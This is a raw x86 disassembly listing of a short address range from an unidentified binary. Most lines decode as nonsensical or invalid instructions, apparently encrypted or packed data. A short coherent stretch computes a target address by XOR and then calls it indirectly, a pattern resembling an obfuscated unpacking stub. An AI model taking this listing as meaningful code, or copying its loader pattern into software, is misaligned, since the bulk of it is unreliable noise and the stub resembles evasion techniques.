  4114bb:	or     eax,0x8f14d1e4
  4114c0:	mov    eax,ds:0x565c2bf3
  4114c5:	add    BYTE PTR [esi],dl
  4114c7:	dec    ecx
  4114c8:	nop
  4114c9:	imul   BYTE PTR ds:0x82a016a1
  4114cf:	fisub  WORD PTR [edi-0x36fab382]
  4114d5:	xor    dh,BYTE PTR [edx]
  4114d7:	push   0x7a
  4114d9:	mov    ebp,0xf3250979
  4114de:	push   eax
  4114df:	pushf  
  4114e0:	xchg   ebp,eax
  4114e1:	out    0x69,eax
  4114e3:	push   eax
  4114e4:	push   cs
  4114e5:	repnz inc ebp
  4114e7:	fild   QWORD PTR [ebx]
  4114e9:	sub    ebp,edi
  4114eb:	out    dx,eax
  4114ec:	mov    BYTE PTR [ebx-0x4778a904],ah
  4114f2:	jecxz  0x41148a
  4114f4:	int    0x7c
  4114f6:	mov    dl,0xde
  4114f8:	mov    bh,0xd4
  4114fa:	adc    BYTE PTR ds:0x369e607,dh
  411500:	clc    
  411501:	js     0x41148c
  411503:	in     al,0x2c
  411505:	(bad)  
  411507:	mov    eax,0xb8caee27
  41150c:	mov    ecx,0xa5a29f13
  411511:	retf   0xf537
  411514:	mov    ebp,0xf7de72f5
  411519:	jnp    0x411522
  41151b:	popf   
  41151c:	add    ecx,DWORD PTR [esi+esi*8+0x79]
  411520:	push   eax
  411521:	xor    BYTE PTR [edi],al
  411523:	add    BYTE PTR [edi+ecx*2+0xb],al
  411527:	das    
  411528:	int3   
  411529:	arpl   cx,bx
  41152b:	sub    BYTE PTR [esi],0x79
  41152e:	jge    0x411537
  411530:	cmc    
  411531:	dec    edx
  411532:	or     esp,DWORD PTR fs:[edi-0x6d031c26]
  411539:	xor    al,0x87
  41153b:	les    edi,FWORD PTR [esi+0x66]
  41153e:	dec    esi
  41153f:	add    DWORD PTR [ecx-0x57bfcd6a],0xffffff85
  411546:	test   BYTE PTR [ebp-0x1c],bh
  411549:	fs (bad) 
  41154b:	(bad)  
  41154c:	outs   dx,DWORD PTR ds:[esi]
  41154d:	mov    eax,ds:0xba137616
  411552:	fs pop esp
  411554:	dec    eax
  411555:	std    
  411556:	loopne 0x4114df
  411558:	sti    
  411559:	sti    
  41155a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41155b:	inc    esi
  41155c:	jecxz  0x411552
  41155e:	or     BYTE PTR [ebx+ebx*8-0x17f2c28],0xff
  411566:	iret   
  411567:	test   DWORD PTR [eax+0x58],0x7ef252
  41156e:	pushf  
  41156f:	xchg   ebx,eax
  411570:	inc    esp
  411571:	xor    bl,al
  411573:	popf   
  411574:	dec    eax
  411575:	out    dx,al
  411576:	inc    ebx
  411577:	xor    eax,DWORD PTR [eax-0x2e2a68bd]
  41157d:	and    DWORD PTR [edx],esi
  41157f:	push   eax
  411580:	(bad)  
  411581:	ffreep st(4)
  411583:	lods   eax,DWORD PTR ds:[esi]
  411584:	call   0x93b5:0xc3fadb35
  41158b:	adc    DWORD PTR [ecx-0x4e],esi
  41158e:	idiv   BYTE PTR [ecx+0x7a]
  411591:	cmc    
  411592:	fsub   QWORD PTR [eax+eax*8+0x1f569f50]
  411599:	jae    0x411601
  41159b:	jecxz  0x41160b
  41159d:	cmp    bl,BYTE PTR [eax]
  41159f:	dec    eax
  4115a0:	aad    0xd
  4115a2:	xchg   ecx,edi
  4115a4:	pop    edi
  4115a5:	add    al,0x86
  4115a7:	or     esp,DWORD PTR [ecx+0x8078861]
  4115ad:	popa   
  4115ae:	shl    BYTE PTR [edx+0x5106c6dc],1
  4115b4:	call   0x6a7c:0xe08aad31
  4115bb:	and    eax,edx
  4115bd:	retf   
  4115be:	pop    ecx
  4115bf:	mov    al,0x6f
  4115c1:	aaa    
  4115c2:	fldcw  WORD PTR [eax-0x28]
  4115c5:	retf   
  4115c6:	in     al,0x2b
  4115c8:	push   esi
  4115c9:	loope  0x4115c5
  4115cb:	mul    DWORD PTR [edi-0x5a]
  4115ce:	sub    bl,BYTE PTR [esp+ebp*8+0x25]
  4115d2:	xor    al,0xfe
  4115d4:	loopne 0x41161b
  4115d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d7:	add    eax,0x2cb6c306
  4115dc:	call   0x558b:0x968663ab
  4115e3:	adc    al,0x33
  4115e5:	rol    DWORD PTR [ebx],0xc6
  4115e8:	imul   eax,DWORD PTR [edx]
  4115eb:	mov    edx,DWORD PTR [ebp-0x4]
  4115ee:	xor    edx,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4115f3:	lea    ecx,[edx+ecx*1+0x32729c]
  4115fa:	cmp    ecx,eax
  4115fc:	jmp    0x4119f0
  411601:	mov    ebx,0x93838448
  411606:	push   ebx
  411607:	mov    ebx,0x78da0248
  41160c:	bound  ebx,QWORD PTR [ecx+0xc]
  41160f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411610:	imul   dh
  411612:	inc    eax
  411613:	jo     0x411685
  411615:	dec    ecx
  411616:	jge    0x411688
  411618:	jo     0x41163b
  41161a:	adc    al,0x67
  41161c:	sbb    dl,dl
  41161e:	aas    
  41161f:	(bad)  
  411620:	into   
  411621:	push   0x37
  411623:	out    dx,eax
  411624:	icebp  
  411625:	jmp    0xb1b1f675
  41162a:	xchg   DWORD PTR [ecx+edi*1],esp
  41162d:	nop
  41162e:	sub    al,0xe2
  411630:	outs   dx,DWORD PTR ds:[esi]
  411631:	push   cs
  411632:	push   cs
  411633:	dec    ebp
  411634:	popf   
  411635:	out    dx,eax
  411636:	in     al,dx
  411637:	retf   0xc7e3
  41163a:	and    al,BYTE PTR [ebx-0x2a6b8e00]
  411640:	dec    edx
  411641:	push   ebp
  411642:	xor    dh,BYTE PTR [ecx]
  411644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411645:	and    eax,0x85788d54
  41164a:	nop
  41164b:	add    al,0xe
  41164d:	leave  
  41164e:	mov    dh,0xaf
  411650:	add    eax,edx
  411652:	loopne 0x4115e8
  411654:	dec    ebp
  411655:	ss cs pop edx
  411658:	cmp    esi,ecx
  41165a:	mov    dl,0x43
  41165c:	push   0x20e95a1c
  411661:	cwde   
  411662:	bound  ebp,QWORD PTR [ebp-0x3e7fbf38]
  411668:	(bad)  
  411669:	repnz shl DWORD PTR [ebx+0x4520e9ba],cl
  411670:	daa    
  411671:	sbb    ah,BYTE PTR [ebp-0x2bec3424]
  411677:	xchg   ecx,eax
  411678:	sub    DWORD PTR [eax-0x5c],esi
  41167b:	jecxz  0x4116ae
  41167d:	ins    DWORD PTR es:[edi],dx
  41167e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41167f:	sahf   
  411680:	out    0x91,al
  411682:	jno    0x411666
  411684:	jne    0x411658
  411686:	gs loop 0x411668
  411689:	mov    bl,0xf
  41168b:	hlt    
  41168c:	cwde   
  41168d:	loopne 0x411647
  41168f:	sbb    DWORD PTR [esi+0x131baa59],edx
  411695:	in     eax,dx
  411696:	cmp    al,0x5d
  411698:	stc    
  411699:	fstp   QWORD PTR [edi-0x406003fb]
  41169f:	iret   
  4116a0:	xor    al,0x90
  4116a2:	in     eax,0x56
  4116a4:	outs   dx,DWORD PTR ds:[esi]
  4116a5:	jmp    0xb650167f
  4116aa:	inc    edi
  4116ab:	loop   0x4116ac
  4116ad:	fsubp  st(1),st
  4116af:	mov    esi,0x33dc15a0
  4116b4:	fst    QWORD PTR [ebx]
  4116b6:	es mov cl,0x42
  4116ba:	add    DWORD PTR ds:0xfe0be12b,0xffffff96
  4116c1:	xchg   edi,eax
  4116c2:	jnp    0x41168a
  4116c4:	or     ah,BYTE PTR [edi+0x58b25a0b]
  4116ca:	cs inc esp
  4116cc:	push   edi
  4116cd:	jecxz  0x4116bc
  4116cf:	ins    DWORD PTR es:[edi],dx
  4116d0:	jbe    0x4116c5
  4116d2:	xor    BYTE PTR [ebp-0x78ab1409],0x96
  4116d9:	cmp    bl,al
  4116db:	inc    ebx
  4116dc:	sahf   
  4116dd:	mov    ah,0x55
  4116df:	fiadd  WORD PTR [edi]
  4116e1:	push   ebp
  4116e2:	jno    0x411762
  4116e4:	sbb    ebp,edx
  4116e6:	mov    edx,0xfbaefbd4
  4116eb:	inc    esp
  4116ec:	call   0x6ff07d86
  4116f1:	jge    0x4116c1
  4116f3:	jo     0x411676
  4116f5:	sub    BYTE PTR [edi-0x62c1caa8],0x83
  4116fc:	jp     0x41168e
  4116fe:	or     BYTE PTR [ebp-0x1050e3fc],bl
  411704:	lock jo 0x4116aa
  411707:	dec    ebp
  411708:	push   esp
  411709:	rol    esp,cl
  41170b:	push   es
  41170c:	cmp    DWORD PTR [esi-0x3c0f82ee],esp
  411712:	sub    bl,BYTE PTR [esi-0x4d]
  411715:	cwde   
  411716:	fcmovne st,st(4)
  411718:	dec    eax
  411719:	push   ebx
  41171a:	cwde   
  41171b:	mov    bl,BYTE PTR [esi-0x41]
  41171e:	ja     0x411750
  411720:	sahf   
  411721:	int    0xb0
  411723:	sub    ah,BYTE PTR [edx+0x2b1c79ab]
  411729:	jns    0x4116ab
  41172b:	test   BYTE PTR [ecx-0x3b5cfe27],ch
  411731:	mov    dl,0x3b
  411733:	mov    ah,0xf7
  411735:	push   esi
  411736:	test   BYTE PTR [ecx+0x25e00c47],al
  41173c:	adc    al,0xa
  41173e:	es push 0xa743a702
  411744:	sub    dl,ch
  411746:	sbb    ch,BYTE PTR [eax]
  411748:	add    dh,BYTE PTR [edi]
  41174a:	cmp    al,0x75
  41174c:	dec    esi
  41174d:	lea    edi,[ecx]
  41174f:	ins    DWORD PTR es:[edi],dx
  411750:	sub    BYTE PTR [edx-0x44c93d1a],0x7a
  411757:	jl     0x4116d9
  411759:	mov    bl,BYTE PTR ds:0x83555748
  41175f:	push   edx
  411760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411761:	std    
  411762:	test   DWORD PTR [eax],esi
  411764:	sub    eax,0x7397f834
  411769:	xor    esp,DWORD PTR [edx]
  41176b:	pop    es
  41176c:	std    
  41176d:	mov    al,0xb7
  41176f:	jno    0x411780
  411771:	ret    
  411772:	jl     0x41179b
  411774:	imul   edi,edi,0xc8968f5f
  41177a:	pop    edx
  41177b:	and    al,0x40
  41177d:	fdecstp 
  41177f:	mov    ah,0x4f
  411781:	jns    0x411750
  411783:	add    dh,bh
  411785:	mov    eax,0x7c8a3a77
  41178a:	xor    DWORD PTR [ebx],ecx
  41178c:	fs (bad) 
  41178e:	cmc    
  41178f:	add    bh,BYTE PTR [edi+0x6539378d]
  411795:	ds push ds
  411797:	mov    ebx,0x19af26c2
  41179c:	gs cs lock out 0x7a,eax
  4117a1:	push   ebp
  4117a2:	neg    DWORD PTR [ebx+0x13]
  4117a5:	retf   
  4117a6:	jno    0x41172b
  4117a8:	mov    esp,0x147f8607
  4117ad:	cmp    al,BYTE PTR [ebp-0x5a]
  4117b0:	jnp    0x41176b
  4117b2:	out    dx,eax
  4117b3:	xor    edi,DWORD PTR [eax]
  4117b5:	sbb    eax,0x50985aaa
  4117ba:	and    BYTE PTR [eax-0x64fc216a],bl
  4117c0:	inc    ecx
  4117c1:	test   eax,0xd5c72a6c
  4117c6:	xchg   esp,eax
  4117c7:	out    dx,al
  4117c8:	mov    ch,0x79
  4117ca:	nop
  4117cb:	xor    eax,DWORD PTR [eax-0x4b738fae]
  4117d1:	sbb    bl,BYTE PTR [ebx-0x4f]
  4117d4:	mov    bl,0x58
  4117d6:	push   ecx
  4117d7:	ret    
  4117d8:	and    ebx,DWORD PTR [ecx+0x50b3d34]
  4117de:	jbe    0x411764
  4117e0:	sti    
  4117e1:	faddp  st(4),st
  4117e3:	ss test eax,0xf44f4bd3
  4117e9:	fdivr  QWORD PTR [ebp+0x4aeafb12]
  4117ef:	xor    DWORD PTR [eax-0x6c],esi
  4117f2:	mov    al,0xc4
  4117f4:	(bad)  
  4117f5:	aaa    
  4117f6:	and    cl,BYTE PTR gs:[ecx]
  4117f9:	scas   eax,DWORD PTR es:[edi]
  4117fa:	rol    DWORD PTR ds:0x3e3976f,0xd6
  411801:	mov    dl,0xad
  411803:	sbb    DWORD PTR [ebx-0x1afc94b2],ebp
  411809:	bound  esi,QWORD PTR ds:0x883d8a74
  41180f:	outs   dx,DWORD PTR ds:[esi]
  411810:	mov    edx,0x16785333
  411816:	pop    ds
  411817:	test   DWORD PTR [esi+0xe4e5d0],0xeee86441
  411821:	dec    ebp
  411822:	(bad)  
  411823:	test   edi,0xf6a12e9f
  411829:	add    DWORD PTR [ecx-0x5b],esp
  41182c:	jae    0x4117f8
  41182e:	push   eax
  41182f:	pop    edi
  411830:	repz inc edx
  411832:	clc    
  411833:	ja     0x411883
  411835:	hlt    
  411836:	xor    al,0x59
  411838:	aam    0x17
  41183a:	fdivr  st,st(2)
  41183c:	jb     0x4117d8
  41183e:	push   eax
  41183f:	cmc    
  411840:	test   eax,0x8888475b
  411845:	and    eax,ebx
  411847:	sub    ecx,esp
  411849:	mov    eax,0xd0e63889
  41184e:	mov    dh,0x10
  411850:	jmp    0xb22f5910
  411855:	sub    ch,BYTE PTR [ecx-0x4c]
  411858:	sbb    edx,DWORD PTR [edx-0x5aac30bc]
  41185e:	call   0x7bc4:0xf4c02f61
  411865:	add    al,0x75
  411867:	jge    0x41189c
  411869:	jo     0x4118db
  41186b:	in     eax,0x9c
  41186d:	mov    edx,0xebef46ae
  411872:	mov    ds:0x73ac3901,al
  411877:	add    al,0x93
  411879:	shl    BYTE PTR [ebx-0x1a395947],1
  41187f:	cmp    ebx,DWORD PTR [eax+0x4b33578]
  411885:	jmp    0x5793:0x8dab6379
  41188c:	test   BYTE PTR [edi],ah
  41188e:	inc    ebp
  41188f:	mov    DWORD PTR [ebp-0x34],edx
  411892:	fwait
  411893:	sbb    al,0xaf
  411895:	cmp    DWORD PTR [edi],0xfffffff1
  411898:	loopne 0x41184d
  41189a:	pop    ebp
  41189b:	gs adc eax,0xe0ff38f9
  4118a1:	push   ecx
  4118a2:	and    eax,0xd6a39d1
  4118a7:	jo     0x4118b1
  4118a9:	xchg   BYTE PTR [ebp-0xc],dh
  4118ac:	imul   BYTE PTR ds:0xb7932f83
  4118b2:	hlt    
  4118b3:	enter  0x4ac3,0xdf
  4118b7:	jns    0x4118a2
  4118b9:	into   
  4118ba:	and    ecx,DWORD PTR [ecx-0x741b6054]
  4118c0:	fwait
  4118c1:	test   BYTE PTR [esi],dh
  4118c3:	sbb    edi,DWORD PTR [eax-0x38]
  4118c6:	js     0x41192b
  4118c8:	nop
  4118c9:	cmp    BYTE PTR [ecx+0x1bb4f9bd],dh
  4118cf:	mov    bh,0x22
  4118d1:	jno    0x411858
  4118d3:	repnz pop ebp
  4118d5:	inc    ebx
  4118d6:	stc    
  4118d7:	cmp    bl,ah
  4118d9:	push   ebp
  4118da:	jmp    0x4118dc
  4118dc:	xchg   ebx,eax
  4118dd:	in     eax,dx
  4118de:	idiv   BYTE PTR [edi+esi*2]
  4118e1:	adc    bl,0x56
  4118e4:	cmp    al,0x89
  4118e6:	korw   k6,k3,k2
  4118ea:	xchg   dh,bh
  4118ec:	rol    DWORD PTR [ecx],cl
  4118ee:	stc    
  4118ef:	fild   DWORD PTR [ecx]
  4118f1:	sbb    DWORD PTR [eax],edi
  4118f3:	xchg   esp,eax
  4118f4:	pop    ecx
  4118f5:	test   eax,0xb67601de
  4118fa:	scas   al,BYTE PTR es:[edi]
  4118fb:	mov    cl,0xec
  4118fd:	or     eax,0x66d1a24c
  411902:	mov    bl,0xf
  411904:	je     0x411933
  411906:	inc    edi
  411907:	enter  0x2035,0xaf
  41190b:	adc    bh,BYTE PTR [eax-0x5a]
  41190e:	cld    
  41190f:	xor    edx,DWORD PTR [esi]
  411911:	lods   al,BYTE PTR ds:[esi]
  411912:	xchg   edx,eax
  411913:	cld    
  411914:	jmp    0x4118b4
  411916:	retf   
  411917:	fnstsw WORD PTR [edx-0x1b0a14c7]
  41191d:	arpl   WORD PTR ds:0x6ffffc76,dx
  411923:	xchg   BYTE PTR [ecx+0x62],al
  411926:	dec    eax
  411927:	and    esi,DWORD PTR [eax]
  411929:	ja     0x4118b2
  41192b:	scas   al,BYTE PTR es:[edi]
  41192c:	sti    
  41192d:	cmp    BYTE PTR [edx],0xa5
  411930:	mov    bh,0x4e
  411932:	ss xor ecx,ebx
  411935:	sub    edi,ebx
  411937:	inc    ecx
  411938:	aad    0xea
  41193a:	sbb    al,0x43
  41193c:	adc    eax,0x14ab2b02
  411941:	push   ecx
  411942:	cdq    
  411943:	pop    DWORD PTR [ebp+0x32]
  411946:	addr16 add al,0x79
  411949:	cli    
  41194a:	inc    ecx
  41194b:	sbb    eax,0xd6ddf6db
  411950:	outs   dx,BYTE PTR ds:[esi]
  411951:	and    ch,cl
  411953:	inc    esi
  411954:	mov    eax,ds:0x5556ee30
  411959:	inc    edx
  41195a:	das    
  41195b:	ja     0x411934
  41195d:	push   ecx
  41195e:	adc    bl,bh
  411960:	rcr    BYTE PTR [esi],1
  411962:	push   ebx
  411963:	js     0x4119a9
  411965:	leave  
  411966:	inc    ebx
  411967:	outs   dx,BYTE PTR ds:[esi]
  411968:	mov    BYTE PTR [edx+0x43bec4cd],dh
  41196e:	movlps xmm7,QWORD PTR [ecx]
  411971:	test   BYTE PTR [eax-0x6389e052],dh
  411977:	add    eax,0x87d579a1
  41197c:	dec    edi
  41197d:	int    0xc8
  41197f:	gs cli 
  411981:	cmp    eax,0x46a02c01
  411986:	cmp    eax,DWORD PTR ds:0x5c2cbadb
  41198c:	jns    0x41193f
  41198e:	sbb    ebp,esp
  411990:	adc    DWORD PTR [ebx+eiz*4+0x37740fa4],ebp
  411997:	dec    eax
  411998:	mov    dh,0x7f
  41199a:	or     eax,0x65f8419d
  41199f:	push   esi
  4119a0:	jns    0x4119e4
  4119a2:	mov    ?,WORD PTR [esi]
  4119a4:	xor    dl,BYTE PTR [edi+0x7c]
  4119a7:	ror    ah,1
  4119a9:	cmp    DWORD PTR [edx],edx
  4119ab:	cdq    
  4119ac:	sub    bl,bh
  4119ae:	pushf  
  4119af:	mov    bl,0x24
  4119b1:	mov    ebp,?
  4119b3:	repnz loop 0x4119f2
  4119b6:	inc    ebp
  4119b7:	sub    eax,0xe7a66408
  4119bc:	adc    edi,eax
  4119be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119bf:	mov    ds:0xc6ed5bd2,al
  4119c4:	popf   
  4119c5:	pop    ecx
  4119c6:	ja     0x4119cf
  4119c8:	bound  esp,QWORD PTR [edx]
  4119ca:	xchg   esp,eax
  4119cb:	xlat   BYTE PTR ds:[ebx]
  4119cc:	inc    ebx
  4119cd:	xor    eax,0x7683713f
  4119d2:	add    BYTE PTR [ebx+0x13],al
  4119d5:	repz push ss
  4119d7:	sbb    DWORD PTR ds:0xd600e520,0x4c
  4119de:	xchg   esi,eax
  4119df:	imul   edx,DWORD PTR [ecx-0xa],0x55
  4119e3:	pop    esp
  4119e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119e5:	fadd   QWORD PTR [eax-0x33]
  4119e8:	jle    0x411a30
  4119ea:	stc    
  4119eb:	sub    eax,0x8d7c5b66
  4119f0:	jne    0x4109bc
  4119f6:	mov    ebx,esi
  4119f8:	jmp    0x411a02
  4119fd:	mov    ebx,0x32729c
  411a02:	mov    eax,DWORD PTR [ebp-0x4]
  411a05:	xor    eax,0x7510855
  411a0a:	add    eax,ebx
  411a0c:	mov    DWORD PTR [ebp-0xc],eax
  411a0f:	xor    ebx,ebx
  411a11:	lea    eax,[ebp-0x10]
  411a14:	add    ebx,DWORD PTR [eax]
  411a16:	call   ebx
  411a18:	xor    ebx,ebx
  411a1a:	inc    ebx
  411a1b:	cmp    DWORD PTR [ebp+0x10],ebx
  411a1e:	je     0x411e30
  411a24:	xchg   edx,eax
  411a25:	push   0xa
  411a27:	pop    ecx
  411a28:	push   0x4
  411a2a:	pop    ebx
  411a2b:	inc    ebx
  411a2c:	jmp    0x411e20
  411a31:	inc    ebp
  411a32:	or     DWORD PTR [edi+0x55d349c7],0xffffff81
  411a39:	push   esi
  411a3a:	ds sbb eax,0x4edfee7d
  411a40:	dec    eax
  411a41:	(bad)  
  411a42:	dec    esp
  411a43:	jo     0x411ab5
  411a45:	dec    ecx
  411a46:	jge    0x411ab8
  411a48:	jo     0x4119f9
  411a4a:	cwde   
  411a4b:	call   0xe04b:0x7f0b3d11
  411a52:	push   ds
  411a53:	dec    edx
  411a54:	or     al,0x13
  411a56:	xlat   BYTE PTR ds:[ebx]
  411a57:	cmp    esi,esp
  411a59:	stc    
  411a5a:	ret    
  411a5b:	imul   ebp,DWORD PTR [edi],0x1e3e68e6
  411a61:	popf   
  411a62:	sub    ebx,edx
  411a64:	inc    esi
  411a65:	and    ch,BYTE PTR [esi-0x6bcacb3b]
  411a6b:	inc    ebp
  411a6c:	dec    edx
  411a6d:	rcl    BYTE PTR [eax+0x409abb03],0xae
  411a74:	jmp    0x1417f50d
  411a79:	sbb    bl,BYTE PTR [eax+ecx*4+0x7860a41f]
  411a80:	xchg   ebp,eax
  411a81:	loop   0x411a92
  411a83:	mov    cl,0x51
  411a85:	or     esp,DWORD PTR [eax+0x10baa020]
  411a8b:	pop    esp
  411a8c:	mov    BYTE PTR [edi],ah
  411a8e:	int3   
  411a8f:	mov    ch,0xbf
  411a91:	and    esp,esi
  411a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a94:	pop    edx
  411a95:	enter  0xaf0e,0x7b
  411a99:	mov    WORD PTR [ebp+ebx*1-0x26],ss
  411a9d:	push   esp
  411a9e:	add    DWORD PTR [ecx-0x5a1173ae],ecx
  411aa4:	into   
  411aa5:	or     eax,0xf9009b2d
  411aaa:	es loope 0x411aaa
  411aad:	bound  edi,QWORD PTR [ebx+0x4a]
  411ab0:	les    ebp,FWORD PTR [esi*2-0x647d7d31]
  411ab7:	(bad)  
  411ab9:	in     al,0x8a
  411abb:	or     ah,al
  411abd:	jbe    0x411a5e
  411abf:	push   eax
  411ac0:	jnp    0x411aeb
  411ac2:	push   0xe36e6aa3
  411ac7:	nop
  411ac8:	push   ds
  411ac9:	dec    ebp
  411aca:	push   es
  411acb:	push   ebx
  411acc:	jbe    0x411af6
  411ace:	popa   
  411acf:	jb     0x411b27
  411ad1:	add    al,0x7a
  411ad3:	inc    ebp
  411ad4:	mov    esp,0x25ce5071
  411ad9:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411adb:	xchg   edx,eax
  411adc:	test   eax,0x157d9bed
  411ae1:	jmp    0x411a87
  411ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ae4:	xor    esi,DWORD PTR [edx+0x56]
  411ae7:	xlat   BYTE PTR ds:[ebx]
  411ae8:	and    DWORD PTR [ebx+0x0],edx
  411aeb:	aaa    
  411aec:	xor    ch,dl
  411aee:	sbb    DWORD PTR [edx-0x183f4b79],edi
  411af4:	xchg   esp,eax
  411af5:	inc    ecx
  411af6:	inc    edi
  411af7:	int    0x46
  411af9:	dec    ecx
  411afa:	movntq QWORD PTR [eax+0x79],mm0
  411afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aff:	imul   esp,DWORD PTR [eax+0x56],0x449235c6
  411b06:	pop    ss
  411b07:	inc    ecx
  411b08:	dec    ebp
  411b09:	and    eax,0x32a6ea05
  411b0e:	sbb    BYTE PTR [edi-0x2c77050d],0x64
  411b15:	jnp    0x411b77
  411b17:	outs   dx,DWORD PTR ds:[esi]
  411b18:	pop    edx
  411b19:	ror    eax,0x5d
  411b1c:	or     cl,BYTE PTR [ebp-0x7f]
  411b1f:	stos   BYTE PTR es:[edi],al
  411b20:	ret    0xb8ea
  411b23:	push   es
  411b24:	popf   
  411b25:	outs   dx,BYTE PTR ds:[esi]
  411b26:	retf   0x2a5c
  411b29:	pop    ds
  411b2a:	cli    
  411b2b:	push   edi
  411b2c:	ret    0x4745
  411b2f:	mov    dh,0xf0
  411b31:	jmp    edx
  411b33:	clc    
  411b34:	jb     0x411acf
  411b36:	sub    bh,BYTE PTR [ebx]
  411b38:	fdivrp st(2),st
  411b3a:	mov    ecx,0xd019251a
  411b3f:	test   DWORD PTR [esi+ecx*8-0x57],0xa6a53d39
  411b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b48:	adc    eax,0x1857bea3
  411b4d:	xor    eax,edx
  411b4f:	int3   
  411b50:	loop   0x411b9f
  411b52:	inc    esi
  411b53:	inc    esi
  411b54:	popa   
  411b55:	mov    esi,0x5934fe96
  411b5a:	(bad)  [edi+0x37]
  411b5d:	push   esp
  411b5e:	push   edi
  411b5f:	pop    eax
  411b60:	or     al,0x78
  411b62:	mov    ebp,0x1156ba80
  411b67:	xchg   ebp,eax
  411b68:	inc    esp
  411b69:	cdq    
  411b6a:	ss mov edx,ebp
  411b6d:	jne    0x411b2f
  411b6f:	fisub  WORD PTR [edi-0x9]
  411b72:	lds    eax,FWORD PTR [ecx]
  411b74:	mov    ch,0x24
  411b76:	jo     0x411b9d
  411b78:	inc    ebx
  411b7a:	iret   
  411b7b:	jg     0x411b35
  411b7d:	iret   
  411b7e:	ds jge 0x411bcd
  411b81:	sti    
  411b82:	sub    DWORD PTR [eax],edi
  411b84:	pusha  
  411b85:	pusha  
  411b86:	sbb    bh,BYTE PTR [edx-0x2010c7b5]
  411b8c:	pop    ds
  411b8d:	popf   
  411b8e:	mov    eax,0x4afcd21e
  411b93:	call   0xf9ed6f61
  411b98:	sbb    al,0xbf
  411b9a:	test   eax,0x71ee6c1e
  411b9f:	push   es
  411ba0:	jne    0x411b8f
  411ba2:	sub    cl,BYTE PTR [edx+0x6b]
  411ba5:	outs   dx,DWORD PTR ds:[esi]
  411ba6:	pop    ecx
  411ba7:	std    
  411ba8:	ja     0x411bbd
  411baa:	push   esp
  411bab:	pop    edx
  411bac:	stc    
  411bad:	jp     0x411b67
  411baf:	lods   eax,DWORD PTR ds:[esi]
  411bb0:	inc    eax
  411bb1:	loope  0x411b63
  411bb3:	pop    ds
  411bb4:	cmp    al,0x6b
  411bb6:	in     eax,0xd
  411bb8:	(bad)  
  411bb9:	adc    BYTE PTR [edi+0x64d1d061],bl
  411bbf:	cmp    BYTE PTR [ebx],dh
  411bc1:	frstor [esi+0x40187f91]
  411bc7:	add    DWORD PTR [ecx+0x9],edi
  411bca:	mov    ebx,ecx
  411bcc:	(bad)  
  411bcd:	retf   
  411bce:	inc    eax
  411bcf:	arpl   bx,ax
  411bd1:	push   eax
  411bd2:	fadd   QWORD PTR [ecx]
  411bd4:	ds xchg edi,eax
  411bd6:	and    al,0x77
  411bd8:	xchg   DWORD PTR [eiz*1-0x39a8c844],ebp
  411bdf:	loop   0x411b61
  411be1:	test   DWORD PTR [ebp-0x70],ebp
  411be4:	jne    0x411bb4
  411be6:	arpl   WORD PTR [edi],si
  411be8:	call   0x4717c27b
  411bed:	ret    0xddb7
  411bf0:	in     al,0x94
  411bf2:	xchg   esp,eax
  411bf3:	(bad)  [edx+ebp*8]
  411bf6:	xor    al,0xb0
  411bf8:	push   ebp
  411bf9:	jae    0x411b85
  411bfb:	cld    
  411bfc:	push   edi
  411bfd:	out    0xd1,eax
  411bff:	(bad)  
  411c00:	fs xchg edi,eax
  411c02:	push   0x2b349f5e
  411c07:	jle    0x411c39
  411c09:	mov    dl,0xb4
  411c0b:	adc    DWORD PTR [eax],0xffffff81
  411c0e:	dec    edi
  411c0f:	cmc    
  411c10:	retf   0x63af
  411c13:	and    BYTE PTR [eax+0xe],cl
  411c16:	add    eax,0xde3f0851
  411c1b:	jg     0x411c8a
  411c1d:	mov    bl,0x4e
  411c1f:	and    al,0x2
  411c21:	add    dl,BYTE PTR [ecx+0x995f1b6]
  411c27:	sub    al,0x4f
  411c29:	adc    al,0x92
  411c2b:	inc    ebp
  411c2c:	lods   eax,DWORD PTR ds:[esi]
  411c2d:	adc    eax,0x872a3ce6
  411c32:	(bad)  
  411c33:	out    dx,al
  411c34:	stos   BYTE PTR es:[edi],al
  411c35:	ja     0x411c4d
  411c37:	scas   eax,DWORD PTR es:[edi]
  411c38:	pop    es
  411c39:	add    eax,0x989d60f7
  411c3e:	(bad)  
  411c40:	push   ebp
  411c41:	lahf   
  411c42:	jg     0x411c01
  411c44:	sbb    ecx,DWORD PTR [edi-0x47]
  411c47:	mov    dl,0xc7
  411c49:	jb     0x411c18
  411c4b:	ja     0x411c35
  411c4d:	icebp  
  411c4e:	std    
  411c4f:	mov    edi,0x47d2c64
  411c54:	jmp    0xcb8acc27
  411c59:	stos   BYTE PTR es:[edi],al
  411c5a:	mov    ch,0xc8
  411c5c:	and    BYTE PTR [ebp-0x7b],cl
  411c5f:	pusha  
  411c60:	xchg   esi,eax
  411c61:	mov    dh,BYTE PTR gs:[ecx-0xc]
  411c65:	sbb    al,0xaa
  411c67:	lea    esi,[edx]
  411c69:	jae    0x411ccf
  411c6b:	or     bl,ah
  411c6d:	je     0x411c39
  411c6f:	lea    eax,[ecx+0x2d]
  411c72:	out    0x6f,eax
  411c74:	push   edi
  411c75:	and    ch,bl
  411c77:	cmp    al,0x31
  411c79:	loope  0x411c5d
  411c7b:	in     al,dx
  411c7c:	adc    ebx,0x9d8f52bf
  411c82:	popa   
  411c83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c84:	mov    eax,ds:0xa555b2a9
  411c89:	clc    
  411c8a:	repnz or edx,DWORD PTR [edi+0x32c50063]
  411c91:	add    DWORD PTR [esi],ebx
  411c93:	xor    DWORD PTR [edx-0x72],edi
  411c96:	fdiv   DWORD PTR [edx+0x45]
  411c99:	mov    WORD PTR [ecx],?
